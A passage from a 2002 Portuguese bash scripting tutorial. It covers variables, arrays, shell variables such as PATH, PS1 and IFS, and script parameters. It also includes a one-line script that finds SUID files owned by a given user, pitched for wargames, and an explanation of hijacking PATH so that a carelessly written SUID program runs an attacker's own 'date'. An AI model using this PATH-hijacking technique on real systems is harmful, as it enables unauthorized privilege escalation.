@@ -1,1 +1,4343 @@
 
+.----------------------------------.
+| Programação em Bourne-Again Shell `------------------------------------,
+| Por MELEU <meleu@meleu.cjb.net>         http://meleu.da.ru     05/2002 |
+`------------------------------------------------------------------------'
+
+
+                     - = <  Í N D I C E  > = -
+
+
+                   0. Intro
+
+                   1. Começando
+
+                   2. Variáveis e Parâmetros
+                     2.1. Variáveis do Usuário
+                       2.1.1. Variáveis Array
+                     2.2. Variáveis do Shell
+                     2.3. Variáveis Somente-Leitura
+                     2.4. Parâmetros
+                       2.4.1. shift
+                       2.4.2. set (para editar parâmetros)
+                     2.5. Substituição de Variáveis
+
+                   3. Entrada e Saída (I/O)
+                     3.1. echo
+                       3.1.1 Sequências de Escape ANSI
+                     3.2. read
+                     3.3. Redirecionamento
+                       3.3.1. Pipe
+                         3.3.1.1. Comandos Úteis com o Pipe
+
+                   4. Comandos de Tomadas de Decisão
+                     4.1. if-then-else e afins
+                       4.1.1. test
+                       4.1.2. let
+                     4.2. case
+                     4.3. Tomadas de decisão com && e ||
+                       4.3.1. Listas
+
+                   5. Comandos de Loop
+                     5.1. for
+                       5.1.1 "for" como na linguagem C
+                     5.2. while
+                     5.3. until
+                     5.4. break e continue
+                     5.5. Redirecionando loops
+
+                   6. Funções
+                     6.1 Funções como comandos
+
+                   7. Tornando seu Script Amigável
+                     7.1. getopts
+                     7.2. select
+                     7.3. dialog
+
+                   8. Coisas úteis de se aprender
+
+                   9. Exemplos Variados
+                     9.1. backup.sh
+                     9.2. howto.sh
+                     9.3. todo.sh
+                     9.4. inseretxt.sh
+                     9.5. Mextract.sh
+
+                   10. Referências
+
+                   11. Considerações Finais
+
+
+
+--------------------------------------------------------------------------
+
+
+0. Intro
+   *****
+
+
+***** PRIMEIRO DE TUDO **************************************************
+*                                                                       *
+*   Esta é a primeira versão do texto e ele está relativamente grande   *
+* para que um único mortal revise-o por inteiro, com o agravante de que *
+* este mortal é um vestibulando. Por favor, se você achar algum erro,   *
+* algo mal explicado, ou tem alguma sugestão para que o texto fique     *
+* melhor mande-me um email: meleu@meleu.cjb.net                         *
+*   Quando eu tiver tempo eu acrescentarei mais coisas...               *
+*                                                                       *
+*************************************************************************
+
+
+   Well... aqui estamos de volta... Dessa vez o assunto é shell script...
+Estou partindo do princípio de que ninguém aqui tem dúvidas quanto a
+utilidade de um shell script. Roubando uma citação de um amigo:
+
+   "Em alguns casos, uma rede pode nao possuir um compilador
+    (Vide Conectiva 5.0), logo, voce precisa se virar com o que tem,
+    e os Shell Scripts podem suprir a sua necessidade em muitos casos."
+
+   Eu já procurei um bocado de material sobre shell script em português na
+net e encontrei vários. Porém a maioria sobre Korn Shell, C Shell, poucos
+eram sobre bash. E os de bash eram muito superficiais. Explicavam só o
+começo de como criar seus shellscripts. Então o que eu pretendo aqui é
+entrar no assunto desde o início e com alguns detalhes (talvez não
+muitos). Note também que muitas coisas explicadas aqui podem ser usadas em
+outros shells.
+   Minhas fontes de pesquisa serão muito úteis para você, que é um newbie
+dedicado. Portanto consulte a seção de referências que você vai achar
+muita coisa boa.
+
+   O único pré-requisito para o entendimento deste texto é que o leitor
+tenha alguma familiaridade com os comandos UNIX. Uma noçãozinha de
+programação (algoritmos) cairia bem. Se você não tem (ou acha que não
+tem) o pré-requisito acima citado, você pode adquirí-lo lendo o focalinux
+<http://www.focalinux.org>, ele é um bom material em português sobre os
+comandos, uso, configuração, etc. do GNU/Linux. Leitura recomendada!
+
+   Se você sabe usar Expressões Regulares fica melhor ainda! Se não sabe
+aprenda a usar! Veja um guia sobre esse assunto na seção de referências.
+
+   É de extrema importância que você vá praticando assim que aprender
+algo novo, isso ajuda a se familiarizar e memorizar as coisas.
+
+   Por favor, não pense que sou um expert ou um guru em shell scripting!
+Eu só estava aprendendo e resolvi escrever isso pra ajudar quem também
+está afim de aprender.
+   Não se esqueça: O aprendizado é eterno! ;-)
+
+   A maioria dos scripts chamam programas existentes no sistema, não
+ficarei explicando o que faz cada comando. Se você quer saber o que ele
+faz, sua sintaxe e etc. procure na página man. Se você tiver alguma
+dúvida sobre o bash use: "help" ou "man bash". A manpage é bastante
+completa (e grande também)! Use-a como referência.
+
+   Para sua comodidade eu coloquei os códigos entre as tags do Phrack
+Extraction Utility. Você pode encontrá-lo na última edição da phrack em
+<http://www.phrack.org>. Eu fiz um script em bash para extração dos
+códigos baseado no Phrack Extraction Utility, chama-se Meleu Extraction
+Utility (hehehe... qualquer semelhança NÃO é mera coincidência). Ele se
+encontra no tópico "9.5. Mextract.sh" e também em
+<http://meleu.da.ru/src/Mextract>.
+   O esquema de organização é o seguinte: exemplos bestas ficam no
+diretório "BashScript/" os exemplos bacanas ficam no diretório
+"BashScript/bacanas/".
+
+ * Atenção na versão em que eu fiz os meus testes, pois em versões antigas
+algumas coisas podem não funcionar (este e é o que vem na instalação do
+Slackware 8.0):
+
+/* -=-=-=-=-= version =-=-=-=-=- */
+meleu@meleu:~$ bash --version
+GNU bash, version 2.05.0(1)-release (i386-slackware-linux-gnu)
+Copyright 2000 Free Software Foundation, Inc.
+/* -=-=-=-=-= version =-=-=-=-=- */
+
+
+Agradecimentos: A todos que fazem um esforcinho para publicar informações
+de qualidade em português.
+Especialmente para meus amiguinhos(as): lucipher, klogd, module, eSc2,
+xf, Emmanuele, Mana_Laura, NashLeon, Hekodangews, Blind_Bard, clausen,
+Renato <www.linuxsecurity.com.br>, hts, EvilLord, aurélio (assim como eu
+também é um dinossauro-amante-do-modo-texto), às pessoas que levam a
+Unsekurity Scene <http://unsekurity.virtualave.net> a sério, aos camaradas
+da EoH Team <http://eoh-team.tk>, e outros pessoas que eu posso não me
+lembrar agora mas que também são meus camaradas. É lógico que também devo
+agradecimentos a toda a comunidade Open Source, sem a qual tudo isso aqui
+não existiria! Amo vocês! =D
+
+LICENSA: Não quero nenhuma exclusividade! Quero é informação fluindo!
+Pegue este texto e espalhe em todo lugar em que ele for bem-vindo.
+   Se quiser extrair trechos dele e puder fazer o favor de citar de onde
+foi extraído, eu me sentiria agradecido.
+
+
+
+--------------------------------------------------------------------------
+
+
+
+1. Começando
+   *********
+
+   Como você já deve saber, um shell script é um arquivo em formato texto
+puro que contém comandos/instruções para serem executados em uma
+determinada shell. O que vou tentar passar neste texto é como fazer shell
+script para o Bourne-Again Shell, ou bash. Esta é uma linguagem
+interpretada (você não precisa compilar para ter o executável) e o bash é
+o interpretador.
+   Veja um exemplo de script:
+
+/* --------------- */
+<++> BashScript/primeiroexemplo.sh
+#!/bin/bash
+echo 'Alo mamãe!'
+echo
+echo 'Agora executarei um simples "ls -l", veja: '
+echo
+ls -l
+<-->
+/* --------------- */
+
+   Para que se possa executar um shell script é necessário permissão de
+execução (mais sobre permissões em http://meleu.da.ru/index.html#textos ).
+Para que somente você (dono do arquivo) tenha permissão de execução
+para o primeiroexemplo.sh você faz:
+
+     $ chmod u+x primeiroexemplo.sh
+
+Agora você pode executar o script da seguinte forma:
+
+     $ ./primeiroexemplo.sh
+
+   Veja outro exemplo de apenas um comando:
+
+/* ----------------- */
+<++> BashScript/procura_suid.sh
+#!/bin/bash
+# script para procurar arquivos suid
+# que pertençam a determinado usuário
+find / -user $1 -perm -4000 2> /dev/null
+<-->
+/* ----------------- */
+   
+   Agora vamos a uma rápida explicação sobre o código...
+- Na primeira linha nós dizemos qual será o nosso intrepretador de
+comandos (o shell). Você deve começar a linha com um "#!" (conhecido como
+sha-bang) e depois o caminho inteiro para o bash.
+- Nas segunda e terceira linhas são usados comentários, todo
+comentário começa com uma cerquilha (#) e vai até o final da linha;
+- A última linha que é realmente o comando, o $1 significa o primeiro
+parâmetro dado na linha de comando (será falado mais sobre isso daqui
+a pouco), por exemplo:
+
+     $ ./procura_suid.sh level5
+
+irá procurar por todos os arquivos suid que pertençam ao usuário level5.
+Como você deve ter reparado, esse shell script é útil nos wargames (veja
+10. Referências), mas tem que ser muito preguiçoso pra fazer um shell
+script de um comando só! :P
+
+   De vez em quando é bom observar o que o script está fazendo. Para isso
+você pode usar alguns parâmetros junto com o shell para executar seu
+script. Veja:
+
+/* -=-=-=-=-=-= debugar =-=-=-=-=-=- */
+$ bash -x BashScript/primeiroexemplo.sh
++ echo 'Alo mamãe!'
+Alo mamãe!
++ echo
+
++ echo 'Agora executarei um simples "ls -l", veja: '
+Agora executarei um simples "ls -l", veja:
++ echo
+
++ ls -l
+total 12
+drwxr-xr-x    5 meleu    users        4096 Aug 18 15:28 GNUstep
+drwxr-xr-x    2 meleu    users        4096 Aug 19 23:11 progs
+drwxr-xr-x    2 meleu    users        4096 Aug 19 22:57 txts
+/* -=-=-=-=-=-= debugar =-=-=-=-=-=- */
+
+   O parâmetro "-x" faz com que seja exibido o comando e depois a saída do
+comando.
+   Outros parâmetros interessantes para a "debuagação" do script são:
+
+      -n        não executa os comandos, apenas verifica
+                erros de sintaxe (noexec);
+      -v        mostra o script e depois executa-o
+                (verbose);
+
+   Outra coisa que devemos saber é que quando um shell script é executado
+ele usa OUTRA SHELL e NÃO USA A SHELL ATUAL. Desculpem eu estar berrando
+deste jeito... :P mas é importante termos isso em mente quando formos usar
+variáveis.
+
+   Falando em variáveis...
+
+
+
+--------------------------------------------------------------------------
+
+
+
+2. Variáveis e Parâmetros
+   **********************
+
+   Ao contrário das outras linguagens, o bash não possui "tipos de dados",
+todas as variáveis são strings. O bash usa strings para representar todos
+os dados que serão usados pelas variáveis. A seguir falaremos sobre os
+*tipos de variáveis* (e não "tipos de dados").
+   Se você conhece alguma outra linguagem de programação sabe que os
+identificadores possuem algumas regras quanto a sua nomeclatura. Pois no
+bash as regras são parecidíssimas:
+
+   * Só se pode usar caracteres alfanuméricos e underline;
+   * Só se pode começar com letra ou underline (número não pode);
+   * Não pode conter espaços em branco;
+   E uma coisa que nós, falantes da língua portuguesa temos que saber é:
+   * Os identificadores NÃO podem conter acentos!
+
+   enfim... todas aquelas regrinhas para identificadores de linguagens de
+programação também se aplica aqui, exceto aquela famosa sobre palavras
+reservadas. Você pode por exemplo fazer "if=lalala" que funcionará
+perfeitamente. A única coisa que não pode é usar um nome que já tenha sido
+definido para uma outra variável e que esta seja "readonly" (mais sobre
+isso adiante). Também deve-se tomar cuidado para não fazer bobagens com
+as variáveis do shell (explicados no tópico 2.2.).
+
+
+
+2.1.  Variáveis do Usuário
+      ====================
+
+   As variáveis do usuário são as variáveis que você pode declarar, ler,
+inicializar e modificar. No exemplo abaixo nós criamos uma variável
+chamada "nome" e atribuímos a ela o valor "Meleu". Veja:
+
+     $ nome=Meleu
+
+   Não pode haver espaços nem antes nem depois do sinal de '='! Se você
+quiser atribuir um valor que contenha espaços é necessário usar as
+'aspas simples'.
+Veja:
+
+     $ nome='Meleu nao eh meleca!'
+
+   Agora para usar a variável é só você colocar um cifrão '$' antes do
+nome dela. Olhe um exemplo com e sem o '$':
+
+     $ echo nome
+     nome
+     $ echo $nome
+     Meleu não eh meleca!
+
+   Existe diferença entre usar 'aspas simples', "aspas duplas", `crases` e
+não usar nada.
+Veja isto:
+
+/* -=-=-=-=-= exemplos =-=-=-=-=- */
+$ caminho='O meu path eh: $PATH'
+$ echo $caminho
+O meu path eh: $PATH
+
+$ caminho="O meu path eh: $PATH"
+$ echo $caminho
+O meu path eh: /usr/local/bin:/usr/bin:/bin:/usr/X11R6/bin:/usr/openwin/bin
+
+$ teste=`ls $HOME`
+$ echo $teste
+GNUstep/ progs/ textos/
+
+$ conteudo_dir="Meu diretorio home contem: `ls $HOME`"
+$ echo $conteudo_dir
+Meu diretorio home contem: GNUstep/ progs/ textos/
+
+$ teste=isso nao eh valido
+bash: nao: command not found
+
+$ teste=mas_isso_eh_valido
+$ echo $teste
+mas_isso_eh_valido
+
+/* -=-=-=-=-= exemplos =-=-=-=-=- */
+
+   Os mais espertos já perceberam as diferenças... mas para os mais
+lerdinhos (como eu) aí vai uma explicação.
+
++ 'aspas simples': atribuem à variável EXATAMENTE o que está entre elas;
+
++ `crases`: atribuem à variável a *saída do comando* que está entre elas,
+            tem a capacidade de ver o conteúdo de uma variável
+            (no exemplo acima, a variável de ambiente $HOME);
+
++ "aspas duplas": atribuem à variável a string, o valor das variáveis que
+                  porventura podem estar entre elas (no segundo exemplo, a
+                  variável de ambiente $PATH), e também a saída de comandos
+                  que estejam entre `crases`;
+
++ nada: similar as aspas duplas, porém ignora espaços excedentes.
+
+   Podemos usar $(cifrão-parênteses) no lugar das crases. Em alguns casos
+é melhor usar $(cifrão-parênteses) mas eu não vou falar em quais, você
+vai descobrir quando. ;-)
+Veja estes exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ dir_atual=$(pwd)
+$ echo $dir_atual
+/home/meleu
+
+$ echo $(ls $HOME)
+GNUstep/ progs/ textos/
+
+$ tar czvf backup_$(date +%d-%m-%Y).tgz arquivo
+/* -=-=-= exemplo =-=-=- */
+
+   Outra coisa interessante é o uso das {chaves}. Você pode usar as chaves
+para exibir uma variável (ex.: echo ${teste}), isso é útil quando você
+precisa separar a variável do que vem depois dela. Veja isto:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ name=coracao
+$ echo ${name}deleao
+coracaodeleao
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+
+   Como eu disse anteriormente, quando executamos um shell script ele usa
+outro shell, portanto toda variável que for criada/inicializada num shell
+script perderá seu valor no final da execução do mesmo. No entanto, você
+pode fazer um shell script usar variáveis de usuário exportando-a
+com o comando "export" (ver man page do bash). Um exemplo simples:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ cat teste.sh
+#!/bin/bash
+
+echo "$VAR"
+
+$ export VAR='Um abraco para os gajos de Portugal! :)'
+$ ./teste.sh
+Um abraco para os gajos de Portugal! :)
+$ export VAR='--> mudei a variavel <--'
+$ ./teste.sh
+--> mudei a variavel <--
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+
+
+2.1.1. Variáveis Array
+       ---------------
+
+   Também conhecidas como vetores. Este tipo de variável serve para se
+armazenar vários valores sob um nome e um índice. A maneira de declarar
+variáveis array é a seguinte:
+
+NomeDaVariavel[Indice]=Valor
+
+sendo que Indice deve ser necessariamente um valor inteiro.
+
+   Imaginemos que EvilLord queira armazenar uma lista de suas frutas
+favoritas em uma variável array. Para isso ele faria o seguinte:
+
+/* -=-=-= exemplo =-=-=- */
+$ FRUTA[0]=goiaba
+$ FRUTA[1]=manga
+$ FRUTA[2]=pera
+$ FRUTA[3]=laranja
+/* -=-=-= exemplo =-=-=- */
+
+   Supondo que ele colocou esta lista em ordem decrescente de gosto, para
+sabermos qual é a sua fruta favorita basta digitarmos:
+
+$ echo ${FRUTA[0]}
+
+   Bacana não acham?
+
+   Agora vejamos uma coisa interessante. Se eu declarar uma frut... ops!
+digo, se eu declarar uma variável assim:
+
+$ FRUTA=goiaba
+
+e depois quiser fazer um array com o nome FRUTA eu posso fazer assim:
+
+$ FRUTA[1]=manga
+
+Desta maneira 'goiaba' passa a ser armazenada em FRUTA[0]   
+
+   Outra coisa interessante é que podemos declarar um array inteiro numa
+única linha de comando. Para isto usamos a sintaxe:
+
+NomeDoArray=(valor1 valor2 ... valorn)
+
+Desta maneira o EvilLord economizaria teclado (?!) digitando isto:
+
+$ FRUTA=(goiaba manga pera laranja)
+
+E para vermos toda a lista de uma vez só, podemos usar o seguinte comando:
+
+$ echo ${FRUTA[*]}
+
+
+   Existem várias outras especificações para arrays mas quero passar aqui
+só o básico. E se você precisar usar arrays de maneira mais complexa que
+isso: vá procurar a documentação oficial do bash! :P
+
+
+
+2.2.  Variáveis do Shell
+      ==================
+
+   Existem variáveis que o shell usa constantemente para um melhor
+funcionamento. O próprio shell inicializa algumas destas variáveis, que
+podem ser lidas e alteradas pelo usuário, estas são conhecidas como
+variáveis do shell. Servem para determinar qual é o seu diretório home, em
+qual diretório o shell vai procurar por comandos que você digitar, seu
+prompt...  enfim... um bocado de coisas. Você pode atribuir novos valores
+para estas variáveis (uma boa é fazer isso no seu ~/.bashrc ou
+~/.bash_profile).
+
+   Vamos ver algumas destas variáveis mais importantes e suas respectivas
+funções.
+
+
+--> HOME
+
+   Esta variável tem um nome bem descritivo não acham? Bem... como nós já
+sabemos, o nosso diretório home é o diretório em que "caímos" assim que
+nos logamos (sabemos também que esta informação se encontra em
+/etc/passwd). Quando você se loga no sistema o bash pega o nome do
+diretório que você está e o atribui à variável HOME.
+   Você já deve ter percebido que quando você dá um "cd" sem nenhum
+argumento você vai para o seu diretório home. Pois o que o cd faz é o
+mesmo que "cd $HOME". Se você alterar o valor de HOME, quando você
+digitar cd sem nenhum argumento o bash vai tentar te levar para o $HOME.
+Veja:
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+meleu:/usr/doc$ echo $HOME
+/home/meleu
+meleu:/usr/doc$ cd
+meleu:~$ pwd
+/home/meleu
+meleu:~$ HOME=/tmp
+meleu:/home/meleu$ cd
+meleu:~$ pwd
+/tmp
+meleu:~$ HOME=lalala
+meleu:/tmp$ cd
+bash: cd: lalala: No such file or directory
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+   Você também já deve ter reparado que quando estamos no nosso home
+aparece um til (~) logo antes do prompt. Observe este detalhe no exemplo
+acima. ;) 
+
+
+--> PATH
+
+   Esta variável armazena o caminho (path) que o shell irá percorrer para
+procurar um comando digitado pelo usuário. Exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+meleu@meleu:/tmp$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/X11R6/bin:/usr/games:/usr/share/texmf/bin
+/* -=-=-= exemplo =-=-=- */
+
+Portanto se eu digitar um "ls" o shell irá procurar pelo "ls" em
+/usr/local/bin depois em /usr/bin e daí em diante.
+   Esta variável algumas vezes pode ser usada no hacking! Imagine que
+um programador inexperiente tenha feito um programa suid que usa a função
+system() (ou qualquer outra função que sirva para executar um comando
+externo), e nesta função ele não usa o caminho completo do programa, e
+sim apenas o nome do programa, supondo que o programa está no seu PATH
+normal. Você pode alterar o PATH e executar um outro programa de sua
+preferência.
+   Vamos supor que o cara use:
+
+   system ("date");
+
+   no lugar de:
+
+   system("/bin/date");
+
+   Aí você faz um programa ou um shell script e nomeia ele como "date".
+Agora é só alterar o PATH para que procure primeiro no diretório onde
+você salvou o SEU date, e então executar o programa suid feito pelo
+incompetente programador. Faça uns testes aí que você vai me
+entender melhor.
+   Esta situação é bem difícil de se encontrar hoje em dia, resolvi
+colocar aqui por questões históricas. :P
+
+
+--> PS1
+
+   Esta é a "Prompt String 1" ou "Primary Prompt String". Nada mais é do
+que o prompt que nos mostra que o shell está esperando um comando. Quando
+você muda PS1 você muda a aparencia do prompt. Na minha máquina o padrão é
+'\u@\h:\w\$ ' onde \u significa o nome do usuario, \h significa o nome do
+host e \w é o diretório atual, o que dá a seguinte aparência:
+
+meleu@meleu:/usr/doc/Linux-HOWTOs$
+
+   Veja algumas possibilidades (na man page do bash tem mais):
+
+              \d    mostra a data atual
+              \h    mostra o hostname
+              \s    o nome do shell
+              \t    a hora atual (no estilo 24 horas)
+              \T    a hora atual (no estilo 12 horas)
+              \u    nome do usuário que está usando o shell
+              \w    nome do diretório atual (caminho todo)
+              \W    nome do diretório atual (somente o nome do diretório)
+
+   Se você estiver afim de ter a impressão de que está no shell do root
+basta trocar o '$' por '#' (bah! que bobagem! :P ).
+   Para aprender a fazer um monte de gracinhas com o PS1 dê uma lida no
+Bash-Prompt-HOWTO (ver 10. Referências)
+
+
+--> PS2
+
+   Esta é a "Secondary Prompt String". É usada quando um comando usa mais
+de uma linha. Por exemplo:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo m\
+> e\
+> l\
+> e\
+> u
+meleu
+$ echo 'm
+> e
+> l
+> e
+> u'
+m
+e
+l
+e
+u
+/* -=-=-= exemplo =-=-=- */
+
+   Este sinal '> ' (maior-espaço) é o PS2. Você pode usar os mesmos
+caracteres especiais que o PS1 usa.
+
+
+--> MAIL
+
+   Nada mais é do que o arquivo onde são guardados seus emails. Aqui na
+minha máquina eu uso o sendmail como servidor de email, portanto:
+
+/* -=-=-= MAIL =-=-=- */
+meleu@meleu:~$ echo $MAIL
+/var/spool/mail/meleu
+/* -=-=-= MAIL =-=-=- */
+
+porém se estivesse usando qmail seria:
+
+/* -=-=-= MAIL =-=-=- */
+meleu@meleu:~$ echo $MAIL
+/home/meleu/Mailbox
+/* -=-=-= MAIL =-=-=- */
+
+
+--> SHLVL
+
+   Esta variável armazena quantos shells você executou a partir da
+primeira shell.
+   Confuso? Vamos a um exemplo.
+   Imagine que você está usando o bash e executou o bash de novo, nesta
+situação o seu SHLVL vale 2. Veja isto:
+
+/* -=-=-= exemplo =-=-=- */
+$ echo $SHLVL
+1
+$ bash		# estou executando o bash a partir do bash
+$ echo $SHLVL
+2
+$ exit		# saí do segundo bash
+exit
+$ echo $SHLVL
+1
+/* -=-=-= exemplo =-=-=- */
+
+   Quando você inicializa scripts a partir do comando "source" o script é
+executado no shell pai, portanto se tiver um "exit" no script você vai
+executar um logoff. É aí que está a utilidade da variável SHLVL. Quando
+você está no shell primário o valor de SHLVL é 1. Então você pode, através
+de um "if" por exemplo, executar o "exit" só se SHLVL for diferente de 1
+(mais informações sobre o source em "6.1 Funções como comandos").
+
+
+
+--> PROMPT_COMMAND
+
+   Esta é bem interessante. Ela armazena um comando que será executado
+toda hora que o prompt é exibido. Veja:
+
+/* -=-=-= exemplo =-=-=- */
+$ PROMPT_COMMAND="date +%T"
+19:24:13
+$ cd
+19:24:17
+$ ls
+GNUstep/  bons.txt  pratica/  teste  worldwritable.txt
+Mail/     hacking/  progs/    txts/
+19:24:19
+$
+19:24:32
+$  # isso eh uma linha sem nenhum comando
+19:24:49
+$
+/* -=-=-= exemplo =-=-=- */
+
+   Esta variável é útil quando queremos brincar com o prompt, para
+aprender mais sobre isso leia o Bash-Prompt-HOWTO (v. 10. Referências).
+
+
+--> IFS
+
+   O shell usa esta variável para dividir uma string em palavras
+separadas. Normalmente o IFS é um espaço, uma tabulação (Tab) e um
+caractere nova linha (\n). Desta maneira:
+
+isto eh uma string
+
+são quatro palavras, pois IFS é um espaço e as palavras estão separadas
+por espaço. Agora se eu mudar IFS para um ':' desta maneira:
+
+IFS=':'
+
+então a string:
+
+isto:eh:uma:string
+
+conterá quatro palavras. Isto é útil para casos como neste exemplo:
+
+/* ----------------- */
+<++> BashScript/path.sh
+#!/bin/bash
+
+IFS=':'
+
+for item in $PATH ; do
+	echo $item
+done
+
+<-->
+/* ----------------- */
+
+   Se IFS for uma variável nula (vazia), tudo será considerado uma única
+palavra. Por exemplo:
+
+se o IFS for nulo, toda essa linha será considerada uma única palavra	
+
+
+
+--> RANDOM
+
+   Quando você exibe esta variável ("echo $RANDOM") é exibido um número
+aleatório entre 0 e 32767.
+   Pra que serve isso?
+   Sei lá! Várias coisas. Quem é criativo sempre precisa de um número
+aleatório... Imagine que você queira um número de telefone celular
+qualquer (sei lá pra quê!), você pode fazer um script que gera um número
+desse pra você. Aqui na minha região estes números começam com 99 ou 98,
+e têm um total de 8 dígitos. O script a seguir gera números que comecem
+com 98 somente:
+
+/* ----------------- */
+<++> BashScript/cellnumbergen.sh
+#!/bin/bash
+
+NUM="98$(echo $RANDOM)0"
+CONT=$(echo -n $NUM | wc -c)	# quantos digitos tem?
+
+while [ $CONT -lt 8 ]; do	# se nao tiver 8 digitos acrescenta 0's
+	NUM=${NUM}0
+	CONT=$(echo -n $NUM | wc -c)
+done
+
+echo $NUM
+<-->
+/* ----------------- */
+
+
+--> Outras
+
+   Outras variáveis que são muito usadas:
+   MAILCHECK ; HISTFILE ; HOSTNAME ; LS_OPTIONS ; LS_COLOR ; MANPATH ;
+   SHELL ; TERM ; USER ; PS3 .
+
+   Estas são as mais utilizadas, porém existem muitas outras. Para ver
+quais são as variáveis definidas no momento basta entrar com o comando
+"set". E para ver apenas as variáveis de ambiente use "env".
+   Olhe a man page do bash na seção "Shell Variables" para mais detalhes.
+
+
+
+2.3. Variáveis Somente-Leitura
+     =========================
+
+   Como sabemos as variáveis podem ter seu valor modificado pelo usuário,
+mas se nós quisermos variáveis que NÃO possam ter seus valores alterados
+basta declararmos tal variável como somente-leitura. Para tornar uma
+variável read-only podemos usar o comando "readonly" ou então
+"declare -r".
+ Veja os exemplos a seguir, ambos possuem o mesmo resultado:
+
+/* -=-=-=-=-= exemplo-1 =-=-=-=-=- */
+$ readonly NOME="Meleu Zord"
+$ echo $NOME
+Meleu Zord
+/* -=-=-=-=-= exemplo-1 =-=-=-=-=- */
+
+/* -=-=-=-=-= exemplo-2 =-=-=-=-=- */
+$ declare -r NOME="Meleu Zord"
+$ echo $NOME
+Meleu Zord
+/* -=-=-=-=-= exemplo-2 =-=-=-=-=- */
+
+   Agora só pra ter certeza:
+
+/* -=-=-= teste =-=-=- */
+$ NOME=Fulano
+bash: NOME: readonly variable
+$ echo $NOME
+Meleu Zord
+/* -=-=-= teste =-=-=- */
+
+   Um bom uso deste tipo de variável é para garantir que variáveis
+importantes de um determinado script não possam ser sobregravadas,
+evitando assim algum resultado crítico.
+
+   O comando "readonly" quando usado sem parâmetros (ou o comando "declare"
+apenas com o parâmetro "-r") nos mostra todas as variáveis declaradas como
+somente-leitura. No exemplo a seguir se for usado "declare -r" no lugar de
+"readonly" teríamos a mesma saída.
+
+/* -=-=-=-=-= readonly =-=-=-=-=- */
+$ readonly
+declare -ar BASH_VERSINFO='([0]="2" [1]="05" [2]="0" [3]="1" [4]="release"
+[5]="i386-slackware-linux-gnu")'
+declare -ir EUID="1005"
+declare -ir PPID="1"
+declare -r
+SHELLOPTS="braceexpand:hashall:histexpand:monitor:ignoreeof:interactive-comments:emacs"
+declare -ir UID="1005"
+/* -=-=-=-=-= readonly =-=-=-=-=- */
+
+   Existem várias variáveis somente-leitura que são inicializadas pelo
+shell, como USER, UID.
+
+   TODAS as variáveis readonly uma vez declaradas não podem ser "unsetadas"
+ou ter seus valores modificado. O único meio de apagar as variáveis
+readonly declaradas pelo usuário é saindo do shell (logout).
+
+
+
+2.4. Parâmetros
+     ==========
+
+   Podemos passar parâmetros para o shell script assim como na maioria
+dos programas. Os parâmetros são variáveis, digamos, especiais. Para
+começar elas não obedecem as regras de nomeclatura de variáveis, pois
+elas usam números; e também nós não podemos mudar o valor destas
+variáveis pelas vias "tradicionais", para mudar o valor destas nós temos
+que contar com a ajuda do shift e/ou do set (como veremos adiante).
+
+Veja esta relação:
+
+     $0                  é o nome do shell script (a.k.a. parâmetro zero);
+
+     $1 a $9             $1 é o primeiro parâmetro, $9 o nono, e
+                         assim por diante;
+
+     ${10}, ${11}...     quando o número do parâmetro possui mais de um
+                         dígito é necessário o uso das chaves;
+
+     $*                  todos os parâmetros em uma única string
+                         (exceto o $0);
+
+     $@                  todos os parâmetros, cada um em strings
+                         separadas (exceto $0);
+
+     $#                  número de parâmetros (sem contar com o $0).
+
+                  Outros:
+
+     $?                  valor de retorno do último comando
+                         (explicado mais adiante);
+
+     $$                  PID do script.
+
+   Pra ficar mais claro, nada melhor do que um exemplo:
+
+/* ------------------ */
+<++> BashScript/parametros.sh
+#!/bin/bash
+#
+# "basename" serve para eliminar o caminho do arquivo e mostrar
+# somente o último nome dele. Neste caso: parametros.sh
+echo "Nome do script: `basename $0`"
+echo "Número total de parâmetros: $#"
+echo "Primeiro parâmetro: $1"
+echo "Segundo parâmetro: $2"
+echo "Décimo quinto parâmetro: ${15}"
+echo "Todos os parâmetros: $*"
+<-->
+/* ------------------ */
+
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+$ ./parametros.sh a b c d e f g h i j l m n o p q r s t u v x z
+Nome do script: parametros.sh
+Número total de parâmetros: 23
+Primeiro parâmetro: a
+Segundo parâmetro: b
+Décimo quinto parâmetro: p
+Todos os parâmetros: a b c d e f g h i j l m n o p q r s t u v x z
+/* -=-=-=-=-= exemplo =-=-=-=-=- */
+
+
+   Se você não entendeu direito a diferença entre o $* e o $@, então dê
+uma olhada no seguinte script (se não entendê-lo tudo bem, siga em frente
+e quando aprender sobre o "if" e o "for" leia-o novamente):
+
+/* ------------------ */
+<++> BashScript/testargs.sh
+#!/bin/bash
+# Ao executar este script entre alguns parametros. Ex.:
+# [prompt]$ ./testargs.sh um dois tres quatro
+
+if [ -z "$1" ]; then
+  echo "Uso: `basename $0` argumento1 argumento2 etc."
+  exit 1
+fi
+
+echo
+echo "Listando argumentos com \"\$*\":"
+num=1
+for arg in "$*"; do
+  echo "Arg #$num = $arg"
+  num=$[ $num + 1 ]
+done
+# Conclusão: $* mostra todos os argumentos como uma única string
+
+echo
+echo "Listando argumentos com \"\$@\":"
+num=1
+for arg in "$@"; do
+  echo "Arg #$num = $arg"
+  num=$[ $num + 1 ]
+done
+# Conclusão: $@ mostra cada argumento em strings separadas
+
+echo
+<-->
+/* ------------------ */
+
+
+
+2.4.1. shift
+       -----
+
+   O bash possui um comando embutido que lida com parâmetros, o shift.
+Quando você usa o shift sai o primeiro parâmetro da lista e o segundo vai
+para $1 o terceiro vai para $2, e assim por diante. Você pode ainda
+especificar quantas "casas" você quer que os parâmetros "andem" à
+esquerda através de "shift n" onde 'n' é o número de casas, mas se o
+número de casas que ele deve andar for maior que o número de parâmetros
+o shift não é executado.
+Veja este exemplo:
+
+/* ------------------ */
+<++> BashScript/shift-exemplo.sh
+#!/bin/bash
+echo "$#: $*"
+echo -e "executando \"shift\""
+shift
+echo "$#: $*"
+echo -e "executando \"shift 5\""
+shift 5
+echo "$#: $*"
+echo -e "executando \"shift 7\""
+shift 7
+echo "$#: $*"
+<-->
+/* ----------------- */
+
+/* -=-=-=-=-= shift =-=-=-=-=- */
+$ ./shift-exemplo.sh 1 2 3 4 5 6 7 8 9 0
